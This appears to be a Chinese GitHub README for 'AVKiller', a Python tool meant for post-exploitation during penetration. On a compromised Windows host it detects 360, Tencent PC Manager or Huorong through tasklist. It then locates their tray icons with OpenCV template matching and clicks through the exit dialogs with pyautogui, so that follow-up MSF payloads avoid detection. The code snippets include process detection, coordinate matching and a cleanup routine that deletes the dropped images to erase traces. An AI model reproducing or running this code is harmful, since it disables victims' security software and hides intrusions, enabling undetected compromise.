# AVKiller
### 该项目目前将会继续更新，下个版本将会有新功能上线，敬请期待！！
## 利用图形化识别技术快速关闭目标机器上的杀毒软件

写该脚本的原因是4月份在进行内网渗透的时候，对MSF木马做了免杀处理，做完免杀的木马可以完美绕过杀毒软件的检测，但是msf木马在执行下一步操作的时候，往往会向目标计算机继续写入exe文件或执行powershell代码，这样的操作几乎都会引发杀毒软件的告警，让渗透的过程被对方察觉，而且MSF生成的后渗透可执行文件已经被所有杀毒软件厂商提取特征码，免杀效率几乎为0。所以才有了为何不直接关闭目标的杀毒软件后再进行后渗透操作的想法。


## 功能实现

### 1.识别杀软

为了实现自动识别杀毒软件的功能，首先要知道系统运行了哪些杀毒软件，CMD命令tasklist可以列出系统正在运行的进程，将其与已知的杀毒软件进行进行匹配即可，如果进程中有与av_process里的进程名，说明该电脑正在运行XX杀毒软件。这里需要做个判断，如果不存在杀毒软件的话，则退出该程序。

	#检测杀毒软件函数，返回杀毒软件名称
	av_process = {'hr': 'HipsTray.exe', 'txgj': 'QQPCTray.exe', '360': '360sd.exe'}
	def runningAVs():
		tasklist = popen('tasklist').read().split()  #运行系统命令tasklist
		for av_exe in av_process.values():
			if av_exe in tasklist:
				usingAV = [k for k, v in av_process.items() if v == av_exe][0]
				return usingAV # 返回目标主机使用的杀毒软件名称


判断目标主机使用的杀毒软件后，由于使用的是图像识别，所以需要将对应的图标和"确认""退出"的字样写入

	# 杀毒软件logo，以及其他字符图片的写入。若不存在杀毒软件，程序退出
	try:
		AV = runningAVs()
		print(AV)
		# 将对应的logo写入
		logo_b64 = b64_AV_logo[AV]
		logo_img = base64.b64decode(logo_b64)
		with open(logoImage, 'wb') as f:
			f.write(logo_img)
			
		# 输出通用的‘退出’字符串图片
		with open(logoutImage, 'wb') as f:
			f.write(base64.b64decode(b64_logout))
			
		# 通过杀毒软件判断最后一步退出步骤应该使用的字样
		#（360与腾讯管家的最后一步“确认”字样底色颜色不一样）
		if AV == r'hr':
			return b64_logout
		elif AV == r'360':
			return b64_blue_comfirm
		else:
			return b64_white_comfirm
	#没检测到杀毒软件，程序退出
	except :
		print('主人，这家伙没开杀毒软件！！！！干他๑乛◡乛๑ ')
		exit()


### 2.坐标获取

知道目标主机运行的程序后就需要准备关闭它了，这时候使用opencv的图像识别技术，找到目标（杀毒软件）logo在屏幕的位置，以坐标形式进行返回，用于对鼠标的定位。

	# 使用opencv获取图标的坐标（logo，退出，确认等字样）
	def get_position(imgSource, imgTarget):
		source = cv2.imread(imgSource, 0)  # 0-灰度处理，防止颜色不同对定位产生影响
		target = cv2.imread(imgTarget, 0)
		wight, height = target.shape[::-1]  # 获取图片长和宽，方便确定文字的中新坐标
		res = cv2.matchTemplate(source, target, cv2.TM_CCOEFF_NORMED)
		min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)
		pos_x = int(max_loc[0] + wight / 2)
		pos_y = int(max_loc[1] + height / 2)
		# print(pos_x, pos_y)
		return pos_x, pos_y


### 3.鼠标操作

这是pyautogui库的功能，此程序用到的只是rightClick，Click功能，主要是利用opencv获取到的坐标，让鼠标进行移动到对应的位置，然后进行右击和点击操作。

### 4.清理痕迹

活干完了，总不能抢前走人吧，至少得擦掉一些痕迹吧！由于需要多次通过图片对比来找到坐标，所以会在目标电脑里保存6张图片，所以当杀毒软件退出后，我们需要将其删除。CMD的del命令可以删除文件（不是移动到回收站，而是直接删除）

	def clean():
	popen(r'del /q {} {} {} {} {} {}'.format(logoutImage, logoImage, comfireImage,screen_before,screen_logout,screen_comfire))


### 5.Tips

#### a)	关于sleep：为什么需要sleep？
Pyautogui进行截屏操作的时候需要时间（100ms左右，电脑性能会导致时间长短不同），sleep时长跟电脑性能有关，如果目标主机性能足够好的话，可以适当减小sleep时长。

#### b)	关于图片存放位置：为什么不直接在当前目录下？
在当前目录下由于图片中有类似‘退出’、‘确认’字样，会被opencv识别，导致定位不准，所以必须保存在其他目录下

#### c)	关于打开右下角隐藏起的图标
Win+B，再按一下空格键或者回车键

#### d)	关于图片保存
先将图片转为base64，需要用的时候再将其解码回来即可。而且重要的是，当进行渗透的时候，只需要上传一个文件！减少上传的文件数量！

#### e)关于图标与桌面的打开软件的图标是否冲突
这个不会，因为opencv识别时的SourceImage和TargetImage大小差别太大不能识别

### 6. 图片展示
![image](https://github.com/PDWR/AVKiller/blob/master/images/360.gif "关闭360")
![image](https://github.com/PDWR/AVKiller/blob/master/images/txgj.gif "关闭腾讯管家")
![image](https://github.com/PDWR/AVKiller/blob/master/images/hr.gif "关闭火绒")
